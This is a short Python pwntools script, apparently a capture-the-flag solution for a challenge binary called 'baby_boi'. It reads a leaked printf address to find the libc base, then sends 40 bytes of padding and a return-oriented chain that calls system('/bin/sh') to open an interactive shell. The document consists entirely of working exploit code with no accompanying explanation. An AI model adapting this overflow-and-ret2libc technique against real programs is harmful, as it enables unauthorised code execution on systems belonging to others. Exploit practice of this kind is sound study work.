from pwn import *

#p = ELF("./baby_boi")
p = process("./baby_boi")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
printf_offset = libc.symbols['printf']

#0x0000000000400793 : pop rdi ; ret
ropgadget_rdi = 0x400793

#gdb.attach(p, gdbscript="b* (main + 167)")

print(p.recvline())
nextline = p.recvline()
print(nextline)
printf_leak = int(str(nextline).split(":")[1][1:-3], 16)

print("libc printf leak: " + str(hex(printf_leak)))
print("libc printf offset is: " + str(hex(printf_offset)))
libc_base = printf_leak - printf_offset

print("libc base is: " + str(hex(libc_base)))

libc.address = libc_base

buff = b"A" * 40
buff += p64(ropgadget_rdi + 1)
buff += p64(ropgadget_rdi)
buff += p64(libc.search(b"/bin/sh").__next__())
buff += p64(libc.symbols['system'])

p.sendline(buff)
p.interactive()